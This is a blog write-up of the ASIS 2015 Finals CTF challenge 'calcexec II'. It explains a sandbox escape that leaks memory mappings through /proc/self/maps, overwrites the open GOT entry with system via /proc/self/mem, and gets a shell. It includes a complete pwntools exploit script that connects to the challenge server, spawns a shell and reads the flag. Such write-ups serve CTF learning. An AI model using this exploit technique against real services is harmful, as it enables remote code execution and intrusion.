---
layout: post
title: ASIS 2015 Finals: calcexec II
modified: 2015-10-14
tags: asis asis2015finals .net mono pwn
---

The second part of the challenge uses an already known technique to break out from "sandboxes".

Namely: overwriting the contents of the /proc/self/mem. This is possible because the calculator contains two methods: READ and WRITE with which we can read and write arbitrary files. (Note: I tried to read "flag2", but unfortunately it did not exist... :))

So I leaked the memory mappings with reading the /proc/self/maps file. Then I overwrote the "open" call's GOT entry to system. And simply called the READ call again with /bin/sh which instead of opening the file, opened a shell for me (btw I tried to call "sh" first, but it turned out it calls a stat function first, and "sh" did not work, but "/bin/sh" did the trick).

Also there were some character encoding problem (it probably tried to interpret the binary input as UTF8 characters), so I only overwrote 3 bytes instead of the full address and the exploit is not reliable: only works if ASLR gives an address with characters which are lower than 0x80.

After calling an "ls" it turned out the flag was in the flag2-03dae19b720939043d87fbf67342c2e8.txt file.

And the flag was: ASIS{9009eeab9869a8098acd7bb19f079230}

{% highlight python %}
#!/usr/bin/env python
from pwn import *
import re
from time import sleep

for i in xrange(10):
    print "Try #%d" % (i + 1)
    p = remote('185.82.202.146', 1337)
    #p = process('./start.sh', shell=True)
    p.recvline()
    p.recvline()

    p.send('authenticate\n')
    p.send(open('fakeCa.crt').read()+'\n')

    p.send('authenticate\n')
    p.send(open('fakeUserCert.crt').read()+'\n')

    p.send('flag\n')
    p.recvuntil('> ')
    print '[!] FLAG 1 = %s' % p.recvline().strip()

    p.send('read("/proc/self/maps",0,20000)\n')
    p.recvuntil('> ')
    maps = p.recvuntil('\x00')
    p.recvuntil('\n\n')
    #print "maps =", maps

    libcBase = int(re.search('([a-z0-9]+).*?libc-2.19.so', maps).group(1), 16)
    libThreadBase = int(re.search('([a-z0-9]+).*?libpthread-2.19.so', maps).group(1), 16)
    print "libThread base = 0x%016x" % libThreadBase

    systemLocal = 0x7ffff74ba230
    libThreadBaseLocal = 0x7ffff74aa000
    openGotAddr = 0x9776C8

    system = libThreadBase - libThreadBaseLocal + systemLocal
    print "system = 0x%016x" % system

    systemChars = p64(system)[0:3]
    if ord(systemChars[0]) >= 128 or ord(systemChars[1]) >= 128 or ord(systemChars[2]) >= 128:
        print "Exploit won't work, restarting..."
        p.close()
        continue
        
    p.send('write("/proc/self/mem",'+str(openGotAddr)+',"'+systemChars+'")\nread("/bin/sh",0,1)\n')
    p.recvline()
    p.recvline()

    time.sleep(0.4)
    p.send('ls && echo LSEND\n')
    print "ls result = %s" % p.recvuntil('LSEND\n').replace('LSEND','').replace('\n', ' ').strip()

    p.send('cat flag2-03dae19b720939043d87fbf67342c2e8.txt\n')
    print "[!] FLAG 2 = %s" % p.recvline().strip()

    p.interactive()
    break
{% endhighlight %}